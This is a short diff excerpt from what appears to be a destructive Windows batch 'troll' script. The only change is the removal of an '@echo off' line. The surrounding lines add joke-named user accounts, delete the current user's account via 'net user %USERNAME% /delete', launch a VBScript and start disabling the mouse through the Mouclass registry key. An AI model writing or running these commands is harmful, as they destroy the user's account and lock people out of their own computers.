@@ -252,7 +252,6 @@ net user wenomechainsamaversion2 troll /add
 net user 𝓽𝓻𝓸𝓳𝓪𝓷 death /add
 net user %USERNAME% /delete
 start sc.vbs
-@echo off
 rem ---------------------------------
 rem Disable Mouse
 set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
